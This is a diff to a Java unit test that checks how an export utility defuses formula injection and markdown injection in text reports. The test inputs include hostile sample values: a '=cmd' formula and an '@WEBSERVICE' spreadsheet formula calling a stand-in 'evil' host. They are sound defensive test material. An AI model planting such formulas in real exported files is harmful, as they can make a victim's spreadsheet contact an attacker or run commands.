@@ -28,4 +28,10 @@ public class ExportTextUtilsTest {
         assertEquals("Example \\# Inject &lt;script&gt; \\[link\\]\\(http://evil/\\)",
                 ExportTextUtils.toMarkdownText("Example\n# Inject <script> [link](http://evil/)"));
     }
+
+    @Test
+    public void toPlainTextReportDefusesEachLineAndNormalizesColumnControls() {
+        assertEquals("' =cmd payload\nplain line\n'@WEBSERVICE(\"http://evil/\")",
+                ExportTextUtils.toPlainTextReport("\t=cmd\rpayload\nplain\tline\n@WEBSERVICE(\"http://evil/\")"));
+    }
 }
